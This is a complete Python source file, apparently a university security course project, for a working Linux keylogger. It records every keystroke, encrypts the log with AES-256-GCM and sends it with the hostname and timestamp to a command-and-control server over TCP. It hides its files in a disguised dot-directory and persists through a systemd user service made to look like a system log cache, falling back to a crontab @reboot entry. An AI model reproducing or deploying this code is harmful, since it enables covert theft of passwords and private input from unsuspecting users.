#!/usr/bin/env python3
"""
Proyecto Unidad 2 - Seguridad Informática
Keylogger con cifrado AES-256-GCM y envío periódico al servidor C2.

Uso:
    python3 keylogger.py [--interval SEGUNDOS] [--server HOST:PUERTO]
"""

import os
import sys
import time
import socket
import struct
import logging
import argparse
import threading
import subprocess
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
except ImportError as e:
    print(f"[ERROR] Dependencia faltante: {e}")
    print("Instale: pip install pynput cryptography requests")
    sys.exit(1)


# Semilla para derivar la clave AES en runtime — no está hardcodeada directamente
MASTER_PASSWORD = b"S3guridad_UTalca_2026"
SALT            = b"proyect0_keylogger_salt_v1"
KEY_ITERATIONS  = 200_000  # iteraciones PBKDF2, más = más costoso para fuerza bruta

# Servidor C2 al que apunta el keylogger (el MITM intercepta transparentemente)
C2_HOST = "192.168.56.10"
C2_PORT = 9999

DEFAULT_SEND_INTERVAL = 30  # segundos entre cada envío al C2

# Archivos ocultos en carpeta del usuario para pasar desapercibidos
LOG_DIR     = Path.home() / ".local" / "share" / ".syslog_cache"
BUFFER_FILE = LOG_DIR / ".kb_buf.enc"   # buffer cifrado temporal en disco
SENT_LOG    = LOG_DIR / ".kb_sent.log"  # historial de envíos

SERVICE_NAME = "syslog-cache.service"   # nombre del servicio systemd (disfrazado)


def derive_key(password: bytes, salt: bytes, iterations: int) -> bytes:
    """Deriva clave AES-256 usando PBKDF2-HMAC-SHA256."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,          # 32 bytes = 256 bits para AES-256
        salt=salt,
        iterations=iterations,
    )
    return kdf.derive(password)


def encrypt_data(plaintext: bytes, key: bytes) -> bytes:
    """Cifra con AES-256-GCM. Retorna nonce (12B) + ciphertext + tag."""
    aesgcm = AESGCM(key)
    nonce  = os.urandom(12)  # nonce aleatorio por cada mensaje (evita reutilización)
    return nonce + aesgcm.encrypt(nonce, plaintext, None)


def decrypt_data(blob: bytes, key: bytes) -> bytes:
    """Descifra blob producido por encrypt_data. Lanza InvalidTag si fue manipulado."""
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(blob[:12], blob[12:], None)  # primeros 12B = nonce


class SecureBuffer:
    """Buffer thread-safe que almacena teclas en memoria y las vuelca a disco cifrado."""

    def __init__(self, key: bytes, buffer_file: Path):
        self._lock     = threading.Lock()
        self._buffer   = []       # teclas capturadas en memoria
        self._key      = key
        self._buf_file = buffer_file
        buffer_file.parent.mkdir(parents=True, exist_ok=True)

    def add(self, key_str: str):
        # thread-safe: el listener y el sender acceden al buffer desde hilos distintos
        with self._lock:
            self._buffer.append(key_str)

    def flush_to_disk(self):
        """Vuelca el buffer en memoria al archivo cifrado en disco."""
        with self._lock:
            if not self._buffer:
                return
            chunk = "".join(self._buffer).encode("utf-8")
            self._buffer.clear()

        # formato: 4 bytes de longitud (big-endian) + blob cifrado
        encrypted = encrypt_data(chunk, self._key)
        length    = struct.pack(">I", len(encrypted))
        with open(self._buf_file, "ab") as f:
            f.write(length + encrypted)

    def drain_disk(self) -> bytes | None:
        """Lee y descifra todos los bloques del archivo en disco, luego lo elimina."""
        if not self._buf_file.exists() or self._buf_file.stat().st_size == 0:
            return None

        parts = []
        with open(self._buf_file, "rb") as f:
            while True:
                length_bytes = f.read(4)
                if not length_bytes:
                    break
                length = struct.unpack(">I", length_bytes)[0]
                blob   = f.read(length)
                if len(blob) < length:
                    break  # archivo incompleto/corrupto
                try:
                    parts.append(decrypt_data(blob, self._key))
                except Exception:
                    pass  # bloque corrupto, se ignora

        self._buf_file.unlink(missing_ok=True)  # limpiar después de drenar
        return b"".join(parts) if parts else None


class KeyloggerListener:
    """Captura pulsaciones de teclado con pynput y las guarda en el SecureBuffer."""

    def __init__(self, buffer: SecureBuffer):
        self._buffer   = buffer
        self._listener = None

    def _format_key(self, key) -> str:
        """Convierte una tecla pynput a string legible."""
        # teclas especiales mapeadas a etiquetas descriptivas
        special_map = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n",
            keyboard.Key.tab:       "\t",
            keyboard.Key.backspace: "[BS]",
            keyboard.Key.delete:    "[DEL]",
            keyboard.Key.esc:       "[ESC]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.ctrl_r:    "[CTRL]",
            keyboard.Key.alt_l:     "[ALT]",
            keyboard.Key.alt_r:     "[ALT]",
            keyboard.Key.shift:     "[SHIFT]",
            keyboard.Key.shift_r:   "[SHIFT]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.up:        "[UP]",
            keyboard.Key.down:      "[DOWN]",
            keyboard.Key.left:      "[LEFT]",
            keyboard.Key.right:     "[RIGHT]",
            keyboard.Key.f1:        "[F1]",
            keyboard.Key.f2:        "[F2]",
            keyboard.Key.f3:        "[F3]",
            keyboard.Key.f4:        "[F4]",
            keyboard.Key.f5:        "[F5]",
            keyboard.Key.f6:        "[F6]",
            keyboard.Key.f7:        "[F7]",
            keyboard.Key.f8:        "[F8]",
            keyboard.Key.f9:        "[F9]",
            keyboard.Key.f10:       "[F10]",
            keyboard.Key.f11:       "[F11]",
            keyboard.Key.f12:       "[F12]",
        }
        if key in special_map:
            return special_map[key]
        try:
            # tecla alfanumérica normal
            return key.char if key.char is not None else f"[{key}]"
        except AttributeError:
            return f"[UNK:{key}]"

    def on_press(self, key):
        # callback invocado por pynput en cada pulsación
        self._buffer.add(self._format_key(key))

    def start(self):
        # corre en hilo daemon: muere junto con el proceso principal
        self._listener = keyboard.Listener(on_press=self.on_press)
        self._listener.daemon = True
        self._listener.start()

    def stop(self):
        if self._listener:
            self._listener.stop()


class PeriodicSender(threading.Thread):
    """Hilo que cada `interval` segundos drena el buffer, cifra y envía al C2."""

    def __init__(self, buffer: SecureBuffer, key: bytes, host: str, port: int, interval: int):
        super().__init__(daemon=True, name="PeriodicSender")
        self._buffer   = buffer
        self._key      = key
        self._host     = host
        self._port     = port
        self._interval = interval
        self._stop_evt = threading.Event()

    def run(self):
        logging.info(f"[SENDER] Iniciado. Intervalo: {self._interval}s → {self._host}:{self._port}")
        # Event.wait() permite detenerse limpiamente sin bloquear con time.sleep()
        while not self._stop_evt.wait(self._interval):
            self._do_send_cycle()

    def _do_send_cycle(self):
        # paso 1: pasar teclas de memoria a disco cifrado
        self._buffer.flush_to_disk()

        # paso 2: leer todo lo acumulado en disco
        payload_plain = self._buffer.drain_disk()
        if not payload_plain:
            return  # nada que enviar

        # paso 3: agregar metadatos de host/timestamp y cifrar
        hostname  = socket.gethostname()
        timestamp = datetime.now().isoformat()
        metadata  = f"[HOST:{hostname}][TIME:{timestamp}]\n".encode("utf-8")
        encrypted = encrypt_data(metadata + payload_plain, self._key)

        # paso 4: enviar al C2
        success  = send_to_c2(encrypted, self._host, self._port)
        status   = "OK" if success else "FAIL"
        log_line = f"{timestamp} | {status} | {len(encrypted)} bytes\n"

        with open(SENT_LOG, "a") as f:
            f.write(log_line)

        if not success:
            # si falló el envío, guardar de vuelta en disco para no perder datos
            logging.warning("[SENDER] Transmisión fallida, guardando para próximo ciclo.")
            enc_backup = encrypt_data(payload_plain, self._key)
            length = struct.pack(">I", len(enc_backup))
            with open(self._buffer._buf_file, "ab") as f:
                f.write(length + enc_backup)

    def stop(self):
        self._stop_evt.set()


def send_to_c2(data: bytes, host: str, port: int) -> bool:
    """Envía blob cifrado al C2 via TCP. Protocolo: 4B longitud + payload."""
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            # primero se envía la longitud para que el servidor sepa cuánto leer
            sock.sendall(struct.pack(">I", len(data)) + data)
        return True
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        logging.warning(f"[C2] Error de transmisión: {e}")
        return False


def install_systemd_persistence(script_path: str):
    """Instala unidad systemd de usuario para ejecutar el keylogger al inicio de sesión."""
    systemd_dir = Path.home() / ".config" / "systemd" / "user"
    systemd_dir.mkdir(parents=True, exist_ok=True)

    # la unidad se registra como usuario (no requiere root)
    service_content = f"""[Unit]
Description=System Log Cache Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=on-failure
RestartSec=5
Environment=DISPLAY=:0
Environment=XAUTHORITY=%h/.Xauthority

[Install]
WantedBy=default.target
"""
    (systemd_dir / SERVICE_NAME).write_text(service_content)

    try:
        subprocess.run(["systemctl", "--user", "enable", SERVICE_NAME], check=True, capture_output=True)
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True, capture_output=True)
        logging.info(f"[PERSISTENCE] Servicio '{SERVICE_NAME}' instalado.")
    except subprocess.CalledProcessError as e:
        # systemd no disponible (ej: Docker), caer a crontab
        logging.warning(f"[PERSISTENCE] systemd no disponible: {e}. Usando crontab.")
        _install_crontab_persistence(script_path)


def _install_crontab_persistence(script_path: str):
    """Fallback de persistencia via crontab @reboot."""
    cron_entry = f"@reboot {sys.executable} {script_path} >> /dev/null 2>&1\n"
    try:
        result   = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        existing = result.stdout if result.returncode == 0 else ""
        if script_path not in existing:  # evitar duplicados
            proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
            proc.communicate((existing + cron_entry).encode())
            logging.info("[PERSISTENCE] Entrada crontab instalada.")
    except Exception as e:
        logging.warning(f"[PERSISTENCE] Error instalando crontab: {e}")


def check_already_running() -> bool:
    """Evita múltiples instancias usando un archivo PID en /tmp."""
    pid_file = Path("/tmp/.syslogd.pid")
    if pid_file.exists():
        try:
            # señal 0 solo verifica si el proceso existe, no lo mata
            os.kill(int(pid_file.read_text().strip()), 0)
            return True  # proceso activo → ya hay una instancia
        except (ProcessLookupError, ValueError):
            pass  # proceso muerto → continuar
    pid_file.write_text(str(os.getpid()))
    return False


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Keylogger - Proyecto Unidad 2 Seguridad")
    parser.add_argument("--interval", type=int, default=DEFAULT_SEND_INTERVAL,
                        help=f"Intervalo de envío en segundos (default: {DEFAULT_SEND_INTERVAL})")
    parser.add_argument("--server", type=str, default=f"{C2_HOST}:{C2_PORT}",
                        help=f"Servidor C2 HOST:PUERTO (default: {C2_HOST}:{C2_PORT})")
    parser.add_argument("--install", action="store_true",
                        help="Instalar persistencia systemd y salir")
    parser.add_argument("--no-persist", action="store_true",
                        help="Ejecutar sin instalar persistencia")
    return parser.parse_args()


def main():
    args = parse_args()

    # log interno oculto, no se muestra en consola
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=str(LOG_DIR / ".debug.log"),
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    try:
        host, port_str = args.server.rsplit(":", 1)
        port = int(port_str)
    except ValueError:
        logging.error(f"Formato inválido: {args.server} (esperado HOST:PUERTO)")
        sys.exit(1)

    # una sola instancia a la vez
    if check_already_running():
        sys.exit(0)

    # derivar la clave AES-256 — misma lógica que server.py para poder descifrar
    aes_key    = derive_key(MASTER_PASSWORD, SALT, KEY_ITERATIONS)
    secure_buf = SecureBuffer(key=aes_key, buffer_file=BUFFER_FILE)

    if args.install:
        install_systemd_persistence(os.path.abspath(__file__))
        print(f"[+] Persistencia instalada: {SERVICE_NAME}")
        sys.exit(0)

    if not args.no_persist:
        install_systemd_persistence(os.path.abspath(__file__))

    # iniciar captura de teclado
    listener = KeyloggerListener(buffer=secure_buf)
    listener.start()

    # iniciar hilo de envío periódico
    sender = PeriodicSender(
        buffer=secure_buf, key=aes_key,
        host=host, port=port, interval=args.interval
    )
    sender.start()

    logging.info(f"[MAIN] Capturando teclado. Intervalo: {args.interval}s")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        sender.stop()
        listener.stop()
        secure_buf.flush_to_disk()  # último flush antes de cerrar
        Path("/tmp/.syslogd.pid").unlink(missing_ok=True)


if __name__ == "__main__":
    main()
